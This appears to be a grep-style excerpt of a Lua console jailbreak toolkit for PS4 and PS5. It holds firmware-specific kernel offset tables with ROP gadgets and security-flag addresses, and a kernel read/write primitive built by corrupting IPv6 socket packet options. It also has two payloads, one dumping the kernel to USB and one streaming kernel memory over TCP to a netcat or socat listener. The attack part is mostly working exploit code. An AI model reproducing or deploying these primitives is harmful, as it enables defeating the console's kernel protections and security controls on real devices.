@@ -1,0 +1,634 @@
+=== savedata/kernel_offset.lua ===
+1-
+2:-- kernel offsets
+3:-- credit to @hammer-83 for these offsets
+4:-- https://github.com/hammer-83/ps5-jar-loader/blob/main/sdk/src/main/java/org/ps5jb/sdk/core/kernel/KernelOffsets.java
+5-
+6:ps5_kernel_offset_list = {
+7-
+8-    [{ "1.00", "1.01", "1.02" }] = {
+9-
+10-        DATA_BASE = 0x01B40000,
+11-        DATA_SIZE = 0x08631930,
+--
+253-        PMAP_STORE_DMPML4I = nil,
+254-        PMAP_STORE_DMPDPI = nil,
+255-    },
+256-}
+257-
+258:ps4_kernel_offset_list = {
+259-    [{ "9.00" }] = {
+260:        EVF_OFFSET          = 0x7f6f27,
+261-        PRISON0             = 0x111f870,
+262-        ROOTVNODE           = 0x21eff20,
+263:        TARGET_ID_OFFSET    = 0x221688d,
+264:        SYSENT_661_OFFSET   = 0x1107f00,
+265-        JMP_RSI_GADGET      = 0x4c7ad
+266-    },
+267-    [{ "9.03", "9.04" }] = {
+268:        EVF_OFFSET          = 0x7f4ce7,
+269-        PRISON0             = 0x111b840,
+270-        ROOTVNODE           = 0x21ebf20,
+271:        TARGET_ID_OFFSET    = 0x221288d,
+272:        SYSENT_661_OFFSET   = 0x1103f00,
+273-        JMP_RSI_GADGET      = 0x5325b
+274-    },
+275-    [{ "9.50", "9.51", "9.60" }] = {
+276:        EVF_OFFSET          = 0x769a88,
+277-        PRISON0             = 0x11137d0,
+278-        ROOTVNODE           = 0x21a6c30,
+279:        TARGET_ID_OFFSET    = 0x221a40d,
+280:        SYSENT_661_OFFSET   = 0x1100ee0,
+281-        JMP_RSI_GADGET      = 0x15a6d
+282-    },
+283-    [{ "10.00", "10.01" }] = {
+284:        EVF_OFFSET          = 0x7b5133,
+285-        PRISON0             = 0x111b8b0,
+286-        ROOTVNODE           = 0x1b25bd0,
+287:        TARGET_ID_OFFSET    = 0x1b9e08d,
+288:        SYSENT_661_OFFSET   = 0x110a980,
+289-        JMP_RSI_GADGET      = 0x68b1
+290-    },
+291-    [{ "10.50", "10.70", "10.71" }] = {
+292:        EVF_OFFSET          = 0x7a7b14,
+293-        PRISON0             = 0x111b910,
+294-        ROOTVNODE           = 0x1bf81f0,
+295:        TARGET_ID_OFFSET    = 0x1be460d,
+296:        SYSENT_661_OFFSET   = 0x110a5b0,
+297-        JMP_RSI_GADGET      = 0x50ded
+298-    },
+299-    [{ "11.00" }] = { -- credit: @egycnq
+300:        EVF_OFFSET          = 0x7fc26f,
+301-        PRISON0             = 0x111f830,
+302-        ROOTVNODE           = 0x2116640,
+303:        TARGET_ID_OFFSET    = 0x221c60d,
+304:        SYSENT_661_OFFSET   = 0x1109350,
+305-        JMP_RSI_GADGET      = 0x71a21
+306-    },
+307-    [{ "11.02" }] = {
+308:        EVF_OFFSET          = 0x7fc22f,
+309-        PRISON0             = 0x111f830,
+310-        ROOTVNODE           = 0x2116640,
+311:        TARGET_ID_OFFSET    = 0x221c60d,
+312:        SYSENT_661_OFFSET   = 0x1109350,
+313-        JMP_RSI_GADGET      = 0x71a21
+314-    },
+315-    [{ "11.50", "11.52" }] = {
+316:        EVF_OFFSET          = 0x784318,
+317-        PRISON0             = 0x111fa18,
+318-        ROOTVNODE           = 0x2136e90,
+319:        TARGET_ID_OFFSET    = 0x21cc60d,
+320:        SYSENT_661_OFFSET   = 0x110a760,
+321-        JMP_RSI_GADGET      = 0x704d5
+322-    },
+323:    [{ "12.00", "12.02" }] = { -- credit: @egycnq
+324:        EVF_OFFSET          = 0x784798,
+325-        PRISON0             = 0x111fa18,
+326-        ROOTVNODE           = 0x2136e90,
+327:        TARGET_ID_OFFSET    = 0x21cc60d,
+328:        SYSENT_661_OFFSET   = 0x110a760,
+329-        JMP_RSI_GADGET      = 0x47b31
+330-    }
+331-}
+332-
+333:function get_ps5_kernel_offset()
+334-
+335:    local kernel_offset = {}
+336-
+337:    for fw_list, offsets in pairs(ps5_kernel_offset_list) do
+338-        for i, check_fw in ipairs(fw_list) do
+339-            if check_fw == FW_VERSION then
+340:                kernel_offset = offsets
+341:                kernel_offset.DATA_BASE_TARGET_ID = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x09
+342:                kernel_offset.DATA_BASE_QA_FLAGS = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x24
+343:                kernel_offset.DATA_BASE_UTOKEN_FLAGS = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x8C
+344-                break
+345-            end
+346-        end
+347-    end
+348-
+349:    -- static structure offsets
+350-    -- note: the one marked with -1 will be resolved at runtime
+351-
+352-    -- proc structure
+353:    kernel_offset.PROC_FD = 0x48
+354:    kernel_offset.PROC_PID = 0xbc
+355:    kernel_offset.PROC_VM_SPACE = 0x200
+356:    kernel_offset.PROC_COMM = -1
+357:    kernel_offset.PROC_SYSENT = -1
+358-
+359-    -- filedesc
+360:    kernel_offset.FILEDESC_OFILES = 0x8
+361:    kernel_offset.SIZEOF_OFILES = 0x30
+362-
+363-    -- vmspace structure
+364:    kernel_offset.VMSPACE_VM_PMAP = -1
+365:    kernel_offset.VMSPACE_VM_VMID = -1
+366-
+367-    -- pmap structure
+368:    kernel_offset.PMAP_CR3 = 0x28
+369-
+370-    -- gpu vmspace structure
+371:    kernel_offset.SIZEOF_GVMSPACE = 0x100
+372:    kernel_offset.GVMSPACE_START_VA = 0x8
+373:    kernel_offset.GVMSPACE_SIZE = 0x10
+374:    kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38
+375-
+376-    -- net
+377:    kernel_offset.SO_PCB = 0x18
+378:    kernel_offset.INPCB_PKTOPTS = 0x120
+379-
+380:    return kernel_offset
+381-end
+382-
+383:function get_ps4_kernel_offset()
+384-
+385:    local kernel_offset = {}
+386-
+387:    for fw_list, offsets in pairs(ps4_kernel_offset_list) do
+388-        for i, check_fw in ipairs(fw_list) do
+389-            if check_fw == FW_VERSION then
+390:                kernel_offset = offsets
+391-                break
+392-            end
+393-        end
+394-    end
+395-
+396-    -- proc structure
+397:    kernel_offset.PROC_FD = 0x48
+398:    kernel_offset.PROC_PID = 0xb0
+399:    kernel_offset.PROC_VM_SPACE = 0x200
+400:    kernel_offset.PROC_COMM = -1
+401:    kernel_offset.PROC_SYSENT = -1
+402-
+403-    -- filedesc
+404:    kernel_offset.FILEDESC_OFILES = 0x0
+405:    kernel_offset.SIZEOF_OFILES = 0x8
+406-
+407-    -- vmspace structure
+408:    kernel_offset.VMSPACE_VM_PMAP = -1
+409:    kernel_offset.VMSPACE_VM_VMID = -1
+410-
+411-    -- pmap structure
+412:    kernel_offset.PMAP_CR3 = 0x28
+413-
+414-    -- net
+415:    kernel_offset.SO_PCB = 0x18
+416:    kernel_offset.INPCB_PKTOPTS = 0x118
+417-
+418:    return kernel_offset
+419-end
+420-
+421:function get_kernel_offset()
+422-    if PLATFORM == "ps4" then
+423:        return get_ps4_kernel_offset()
+424-    elseif PLATFORM == "ps5" then
+425:        return get_ps5_kernel_offset()
+426-    end
+427-end
+428-
+429:-- find some structure offsets at runtime
+430:function update_kernel_offsets()
+431-
+432:    local offsets = find_additional_offsets()
+433-
+434:    for k,v in pairs(offsets) do
+435:        kernel_offset[k] = v
+436-    end
+437-end
+438-
+439--- credit: @hammer-83
+440:function find_vmspace_pmap_offset()
+441-
+442:    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)
+443-
+444:    -- Note, this is the offset of vm_space.vm_map.pmap on 1.xx.
+445-    -- It is assumed that on higher firmwares it's only increasing.
+446:    local cur_scan_offset = 0x1C8
+447-
+448-    for i=1,6 do
+449:        local scan_val = kernel.read_qword(vmspace + cur_scan_offset + (i * 8))
+450:        local offset_diff = (scan_val - vmspace):tonumber()
+451:        if offset_diff >= 0x2C0 and offset_diff <= 0x2F0 then
+452:            return cur_scan_offset + (i * 8)
+453-        end
+454-    end
+455-
+456:    error("failed to find VMSPACE_VM_PMAP offset")
+457-end
+458-
+459-
+460--- credit: @hammer-83
+=== savedata/offsets.lua ===
+22-in the event where game identification via `luaB_auxwrap` is not sufficient.
+23-i.e. Some games have the same eboot but have different libc libraries.
+24-In the event of a clash:
+25-  - Add `clash = 0x1` to libc_addrofs for the parent game.
+26-    - i.e. a game present in `games_identification` above.
+27:  - Add `libc_addrofs` offsets for affected games to the `gadget_table`.
+28-  - Add affected games to `lua.resolve_libc_clash_game_by_name`.
+29-The CRC32 should give the same result as Python zlib's CRC32 implementation.
+30-]]
+31-libc_identification = {
+32-    [0x8e236ee4] = "Aikagi2", -- Family: [F]
+--
+1093-            Mtx_unlock = 0x223A0,
+1094-
+1095-            Atomic_fetch_add_8 = 0xE380,
+1096-        }
+1097-    },
+1098:    -- Games with clashes below here, only libc offsets are required.
+1099-    f = {  -- Clashes with Aikagi2
+1100-        libc_addrofs = {
+1101-            calloc = 0x4E910,
+1102-            memcpy = 0x44150,
+1103-            setjmp = 0xB2D60,
+=== savedata/kernel.lua ===
+29-function kernel.read_qword(kaddr)
+30-    local value = kernel.read_buffer(kaddr, 8)
+31-    return value and #value == 8 and uint64.unpack(value) or nil
+32-end
+33-
+34:function kernel.hex_dump(kaddr, size)
+35-    size = size or 0x40
+36:    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
+37-end
+38-
+39-function kernel.read_null_terminated_string(kaddr)
+40-
+41-    local result = ""
+--
+92-    ipv6_kernel_rw.create_pipe_pair()
+93-    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
+94-end
+95-
+96-function ipv6_kernel_rw.get_fd_data_addr(fd)
+97:    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * kernel_offset.SIZEOF_OFILES
+98-    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0) -- fde_file
+99-    return ipv6_kernel_rw.kread8(file_addr + 0x0) -- f_data
+100-end
+101-
+102-function ipv6_kernel_rw.create_pipe_pair()
+--
+124-
+125-    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
+126-    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)
+127-
+128-    local master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
+129:    local master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB)
+130:    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS)
+131-
+132-    local slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
+133:    local slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB)
+134:    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS)
+135-
+136-    -- magic
+137-    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)
+138-
+139-    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
+--
+341-        kernel.read_buffer = ipv6_kernel_rw.read_buffer
+342-        kernel.write_buffer = ipv6_kernel_rw.write_buffer
+343-
+344-        kernel.rw_initialized = true
+345-
+346:        update_kernel_offsets()
+347-    end
+348-end
+349-
+350-
+351-function is_kernel_rw_available()
+--
+367-    assert(kernel.addr.allproc)
+368-
+369-    local proc = kernel.read_qword(kernel.addr.allproc)
+370-    while proc ~= uint64(0) do
+371-
+372:        local proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM)
+373-        if proc_name == name then
+374-            return proc
+375-        end
+376-
+377-        proc = kernel.read_qword(proc + 0x0) -- le_next
+--
+389-    assert(type(pid) == "number")
+390-
+391-    local proc = kernel.read_qword(kernel.addr.allproc)
+392-    while proc ~= uint64(0) do
+393-
+394:        local proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID):tonumber()
+395-        if proc_pid == pid then
+396-            return proc
+397-        end
+398-
+399-        proc = kernel.read_qword(proc + 0x0) -- le_next
+--
+405-
+406-function get_proc_cr3(proc)
+407-
+408-    check_kernel_rw()
+409-
+410:    local vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE)
+411:    local pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP)
+412-
+413:    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3)
+414-end
+415-
+416--- translate virtual address to physical address
+417--- note: use kernel page table if cr3 is not given
+418-function virt_to_phys(virt_addr, cr3)
+--
+442-    local target_proc = find_proc_by_name(target_proc_name)
+443-    if not target_proc then
+444-        errorf("failed to find proc addr of %s", target_proc_name)
+445-    end
+446-
+447:    local cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT)  -- struct sysentvec
+448:    local target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT)
+449-
+450-    local cur_table_size = kernel.read_dword(cur_sysent) -- sv_size
+451-    local target_table_size = kernel.read_dword(target_sysent)
+452-
+453-    local cur_table = kernel.read_qword(cur_sysent + 0x8) -- sv_table
+=== payloads/kernel_dumper.lua ===
+1--- @egycnq
+2-
+3-function get_kernel_elf_size()
+4:    -- ELF header offsets
+5:    local E_PHNUM_OFFSET = 0x38  -- Number of program headers
+6:    local E_PHOFF_OFFSET = 0x40  -- Program header offset (should be 0x40)
+7-
+8-    -- Program header entry size
+9-    local PHDR_SIZE = 0x38
+10-
+11-    -- Program types
+12-    local PT_LOAD = 1
+13-    local PT_SCE_RELRO = 0x61000000
+14-
+15-    -- Read number of program headers
+16:    local e_phnum = kernel.read_word(kernel.addr.data_base + E_PHNUM_OFFSET):tonumber()
+17-    printf("Number of program headers: %d", e_phnum)
+18-
+19-    local end_addr = kernel.addr.data_base:tonumber()  -- Convert kbase to number for comparison
+20-
+21-    -- Parse each program header
+22-    for i = 0, e_phnum - 1 do
+23:        local phdr_offset = E_PHOFF_OFFSET + (i * PHDR_SIZE)
+24-
+25:        -- Read p_type (4 bytes at offset 0x00)
+26:        local p_type = kernel.read_dword(kernel.addr.data_base + phdr_offset):tonumber()
+27-
+28-        -- Only process PT_LOAD and PT_SCE_RELRO segments
+29-        if p_type == PT_LOAD or p_type == PT_SCE_RELRO then
+30-            -- Read segment details and convert to numbers
+31:            local p_vaddr = kernel.read_qword(kernel.addr.data_base + phdr_offset + 0x10):tonumber()
+32:            local p_memsz = kernel.read_qword(kernel.addr.data_base + phdr_offset + 0x28):tonumber()
+33:            local p_align = kernel.read_qword(kernel.addr.data_base + phdr_offset + 0x30):tonumber()
+34-
+35-            -- Calculate aligned end address
+36-            local segment_end = p_vaddr + p_memsz
+37-
+38-            -- Apply alignment (next_multiple_of)
+--
+56-    local total_size = end_addr - kernel.addr.data_base:tonumber()
+57-    printf("Kernel size: 0x%X", total_size)
+58-    return total_size
+59-end
+60-
+61:function dump_kernel_elf()
+62-    -- Constants
+63-    local CHUNK_SIZE = 0x4000              -- 16KB chunks
+64-    local PROGRESS_INTERVAL = 0x500000     -- Progress update every 5MB
+65-    local NOTIFICATION_INTERVAL = 10       -- Notification every 10 seconds
+66:    local OUTPUT_PATH = "/mnt/usb0/kernel.elf"
+67-    local FILE_PERMISSIONS = tonumber("0777", 8)
+68-    local BYTES_PER_MB = 1048576
+69-    local BYTES_PER_KB = 1024
+70-
+71-    -- File flags
+--
+74-    local O_TRUNC = 0x0400
+75-
+76-    local fd = nil  -- Track file descriptor for cleanup
+77-
+78-    -- Send start notification
+79:    send_ps_notification("Starting kernel dump...")
+80-
+81-    -- Input validation
+82-    if not kernel.addr.data_base or kernel.addr.data_base == 0 then
+83-        local error_msg = "Invalid kernel base address"
+84-        print(error_msg)
+--
+129-        print(error_msg)
+130-        send_ps_notification(error_msg)
+131-        return false
+132-    end
+133-
+134:    -- Calculate size in MB and start dumping
+135-    local size_mb = math.floor(kernel_size / BYTES_PER_MB)
+136:    send_ps_notification(string.format("Dumping %d MB kernel...", size_mb))
+137-
+138:    print("Dumping kernel to " .. OUTPUT_PATH)
+139:    printf("Total size to dump: 0x%X bytes (%d MB)", kernel_size, size_mb)
+140-
+141:    -- Dump in chunks
+142:    local offset = 0
+143-    local start_time = os.clock()
+144-    local last_notification_time = start_time
+145:    local dump_success = false
+146-
+147:    while offset < kernel_size do
+148-        -- Calculate how much to read
+149:        local to_read = math.min(CHUNK_SIZE, kernel_size - offset)
+150-
+151-        -- Read from kernel memory
+152-        local read_ok, data = pcall(function()
+153:            local read_addr = kernel.addr.data_base + offset
+154-            return kernel.read_buffer(read_addr, to_read)
+155-        end)
+156-
+157-        if not read_ok or not data then
+158:            local error_msg = string.format("Kernel read failed at offset 0x%X: %s", offset, tostring(data))
+159-            print(error_msg)
+160-            send_ps_notification("Kernel read failed!")
+161-            break
+162-        end
+163-
+--
+184-            print(error_msg)
+185-            send_ps_notification(error_msg)
+186-            break
+187-        end
+188-
+189:        offset = offset + written
+190-
+191-        -- Progress update
+192:        if offset % PROGRESS_INTERVAL == 0 or offset == kernel_size then
+193:            local progress_pct = math.floor((offset * 100) / kernel_size)
+194-            local elapsed = os.clock() - start_time
+195:            local speed_kbps = math.floor(offset / BYTES_PER_KB / elapsed)
+196-
+197-            printf("Progress: 0x%X / 0x%X (%d%%) - Speed: %d KB/s",
+198:                offset, kernel_size, progress_pct, speed_kbps)
+199-
+200-            -- Send notification every NOTIFICATION_INTERVAL seconds
+201-            local current_time = os.clock()
+202-            if current_time - last_notification_time > NOTIFICATION_INTERVAL then
+203:                send_ps_notification(string.format("Dumping... %d%%", progress_pct))
+204-                last_notification_time = current_time
+205-            end
+206-        end
+207-    end
+208-
+209-    -- Check if we completed successfully
+210:    dump_success = (offset == kernel_size)
+211-
+212:    if dump_success then
+213-        -- Sync to ensure all data is written
+214-        print("Syncing data to disk...")
+215-        local sync_result = syscall.fsync(fd)
+216-        local sync_ok = sync_result and sync_result:tonumber() >= 0
+217-
+--
+220-            send_ps_notification("Warning: sync failed!")
+221-        end
+222-
+223-        -- Final stats
+224-        local total_time = os.clock() - start_time
+225:        local avg_speed_kbps = math.floor(offset / BYTES_PER_KB / total_time)
+226-
+227:        printf("Dump completed in %d seconds", math.floor(total_time))
+228:        printf("Successfully dumped 0x%X bytes (%d MB)", offset, math.floor(offset / BYTES_PER_MB))
+229-        printf("Average speed: %d KB/s", avg_speed_kbps)
+230-
+231-        -- Send completion notification with formatted time
+232-        local completion_msg
+233-        if total_time < 60 then
+234:            completion_msg = string.format("Kernel dumped! Time: %d seconds", math.floor(total_time))
+235-        else
+236-            local minutes = math.floor(total_time / 60)
+237-            local seconds = math.floor(total_time - (minutes * 60))
+238:            completion_msg = string.format("Kernel dumped! Time: %d:%02d", minutes, seconds)
+239-        end
+240-
+241-        send_ps_notification(completion_msg)
+242-    end
+243-
+244-    -- Always close file descriptor if it was opened
+245-    if fd and fd >= 0 then
+246-        syscall.close(fd)
+247-    end
+248-
+249:    return dump_success
+250-end
+251-
+252-function main()
+253-    if PLATFORM ~= "ps4" then
+254-        error("this payload only targets ps4")
+255-    end
+256-
+257-    check_jailbroken()
+258-
+259:    dump_kernel_elf()
+260-end
+261-
+262-main()
+=== payloads/kdata_dumper.lua ===
+1-
+2---[[
+3:    run netcat/socat on the other end to receive the kernel data dump
+4-    1) either through netcat
+5:        $ nc -nlvp 5656 > kernel_data_dump.bin
+6-    2) or through socat
+7:        $ socat -u TCP-LISTEN:5656,reuseaddr OPEN:kernel_data_dump.bin,create,trunc
+8-]]
+9-
+10-IP = "192.168.1.2"
+11-PORT = 5656
+12-
+--
+17-function aton(ip)
+18-    local a, b, c, d = ip:match("(%d+).(%d+).(%d+).(%d+)")
+19-    return bit32.bor(bit32.lshift(d, 24), bit32.lshift(c, 16), bit32.lshift(b, 8), a)
+20-end
+21-
+22:function find_kdata_base_offset(addr_inside_kdata)
+23-
+24-    print("start searching for kdata base...")
+25-
+26-    local addr = bit64.band(addr_inside_kdata, bit64.bnot(PAGE_SIZE-1))
+27-
+28:    local offset = 0
+29-    while true do
+30-
+31:        local n1 = kernel.read_dword(addr-offset):tonumber()
+32:        local n2 = kernel.read_dword(addr-offset+4):tonumber()
+33:        local n3 = kernel.read_dword(addr-offset+8):tonumber()
+34:        local n4 = kernel.read_dword(addr-offset+12):tonumber()
+35-
+36-        if n1 == 1 and n2 == 1 and n3 == 0 and n4 == 0 then
+37:            return addr - offset
+38-        end
+39-
+40:        offset = offset + PAGE_SIZE
+41-    end
+42-
+43-end
+44-
+45:function dump_kdata_over_network(kdata_base)
+46-
+47-    local sock_fd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
+48-    if sock_fd == -1 then
+49-        error("socket() error: " .. get_error_string())
+50-    end
+--
+61-        error("connect() error: " .. get_error_string())
+62-    end
+63-
+64-    print("connected sucessfully")
+65-
+66:    print("dumping kdata until crashing...")
+67-
+68-    local read_size = PAGE_SIZE
+69-    local mem = memory.alloc(read_size)
+70-
+71-    local MB = 0x100000
+72-
+73:    local offset = 0
+74-    while true do
+75-
+76:        kernel.copyout(kdata_base + offset, mem, read_size)
+77-
+78-        if syscall.write(sock_fd, mem, read_size):tonumber() == -1 then
+79-            error("write() error: " .. get_error_string())
+80-            break
+81-        end
+82-
+83:        if offset % (5 * MB) == 0 then
+84:            printf("dumping kernel data: %d mb", offset / MB)
+85-        end
+86-
+87:        offset = offset + read_size
+88-    end
+89-
+90-end
+91-
+92-
+--
+101-    local kdata_base = kernel.addr.data_base
+102-
+103-    -- if kdata base is unknown, search for it
+104-    if not kdata_base then
+105-        if not kernel.addr.inside_kdata then
+106:            error("an address inside kdata is needed for dumper to work")
+107-        end
+108:        kdata_base = find_kdata_base_offset(kernel.addr.inside_kdata)
+109-    end
+110-
+111-    printf("kdata base: %s", hex(kdata_base))
+112-
+113:    dump_kdata_over_network(kdata_base)
+114-end
+115-
+116-main()
+117-
